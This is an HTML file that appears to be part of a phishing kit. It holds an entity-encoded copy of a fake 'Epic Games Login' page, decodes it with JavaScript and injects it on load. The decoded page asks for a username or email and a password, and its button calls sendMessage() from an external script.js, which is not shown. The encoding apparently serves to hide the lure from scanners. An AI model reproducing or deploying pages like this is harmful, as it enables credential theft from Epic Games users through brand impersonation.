<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Encoded HTML Example</title>
</head>
<body>
    <div id="encoded-html"></div>

    <script>
        // Function to decode HTML entities
        function decodeEntities(encodedString) {
            var parser = new DOMParser();
            var dom = parser.parseFromString('<!doctype html><body>' + encodedString, 'text/html');
            return dom.body.textContent;
        }

        // Encoded HTML string
        var encodedHTML = '&lt;!DOCTYPE html&gt;' +
            '&lt;html lang="en"&gt;' +
            '&lt;head&gt;' +
            '    &lt;meta charset="UTF-8"&gt;' +
            '    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;' +
            '    &lt;title&gt;Epic Games Login&lt;&#x2F;title&gt;' +
            '    &lt;link rel="stylesheet" href="styles.css"&gt;' +
            '&lt;&#x2F;head&gt;' +
            '&lt;body&gt;' +
            '    &lt;div class="login-container"&gt;' +
            '        &lt;div class="login-box"&gt;' +
            '            &lt;h2&gt;Login to your Epic Games Control Account Panel&lt;&#x2F;h2&gt;' +
            '            &lt;form id="loginForm"&gt;' +
            '                &lt;div class="input-group"&gt;' +
            '                    &lt;label for="username"&gt;Username or Email&lt;&#x2F;label&gt;' +
            '                    &lt;input type="text" id="input1" name="username" required&gt;' +
            '                &lt;&#x2F;div&gt;' +
            '                &lt;div class="input-group"&gt;' +
            '                    &lt;label for="password"&gt;Password&lt;&#x2F;label&gt;' +
            '                    &lt;input type="password" id="input2" name="password" required&gt;' +
            '                &lt;&#x2F;div&gt;' +
            '                &lt;button type="button" onclick="sendMessage()"&gt;Login&lt;&#x2F;button&gt;' +
            '            &lt;&#x2F;form&gt;' +
            '            &lt;script src="script.js"&gt;&lt;&#x2F;script&gt;' +
            '            &lt;p class="signup-link"&gt;Don&apos;t have an account? &lt;a href="#"&gt;Sign up here&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;' +
            '        &lt;&#x2F;div&gt;' +
            '    &lt;&#x2F;div&gt;' +
            '&lt;&#x2F;body&gt;' +
            '&lt;&#x2F;html&gt;';

        // Decode and render the HTML
        document.getElementById('encoded-html').innerHTML = decodeEntities(encodedHTML);
    </script>
</body>
</html>
